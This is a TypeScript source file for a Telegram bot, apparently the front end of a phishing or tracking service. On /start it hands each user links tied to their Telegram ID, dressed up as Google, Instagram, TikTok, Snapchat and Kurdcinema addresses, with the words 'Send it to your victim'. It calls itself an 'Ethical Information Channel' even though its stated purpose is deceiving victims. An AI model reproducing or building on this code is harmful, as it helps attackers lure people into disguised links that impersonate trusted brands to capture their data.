import { autoRetry } from "@grammyjs/auto-retry";
import { limit } from "@grammyjs/ratelimiter";
import type { BotCommand } from "@grammyjs/types";
import { Bot, type CommandContext, type Context, type HearsContext, Keyboard } from "grammy";
import { envs } from "./envs";

const KEYBOARD = {
	start: "Start Bot",
	info: "Ethical Information Channel",
} as const;

const STATIC_KEYBOARD = new Keyboard().text(KEYBOARD.start).row().text(KEYBOARD.info).row().persistent().resized();

type StartContext = CommandContext<Context> | HearsContext<Context>;
async function startHandler(ctx: StartContext) {
	if (!ctx.from) {
		await ctx.reply("Unfortunately, I can't proceed at this time.\n\n" + "Please try again.\n\n" + "/start");
		return;
	}

	const link = `${envs.APP_URL}/${ctx.from.id}`;

	await ctx.reply(
		"@xByteBlitzX\n@SeeYouIOSVIP\n\n" +
			"Send it to your victim\n\n" +
			"Google:\n" +
			`https://google.${link}\n\n` +
			"Instagram:\n" +
			`https://instagram.${link}\n\n` +
			"Tiktok:\n" +
			`https://tiktok.${link}\n\n` +
			"Snapchat:\n" +
			`https://snapchat.${link}\n\n` +
			"Kurdcinema:\n" +
			`https://kurdcinema.${link}\n\n` +
			">>>>\n" +
			"@xByteBlitzX\n@SeeYouIOSVIP\n@xN1ghtmare",
		{
			parse_mode: "HTML",
			reply_markup: STATIC_KEYBOARD,
		},
	);
}

export const bot = new Bot(envs.TELEGRAM_TOKEN);

bot.api.config.use(autoRetry());
bot.use(
	limit({
		onLimitExceeded: (ctx) => console.warn("Rate limit exceeded", ctx.from?.id),
	}),
);

bot.command("start", startHandler);
bot.hears(KEYBOARD.start, startHandler);
bot.hears(KEYBOARD.info, async (ctx) => await ctx.reply("Ethical Information : https://t.me/xByteBlitzX"));

bot.errorBoundary((error) => {
	console.error("An error occurred in the bot:", error);
});

export const COMMANDS: BotCommand[] = [
	{
		command: "start",
		description: "Start Bot",
	},
];
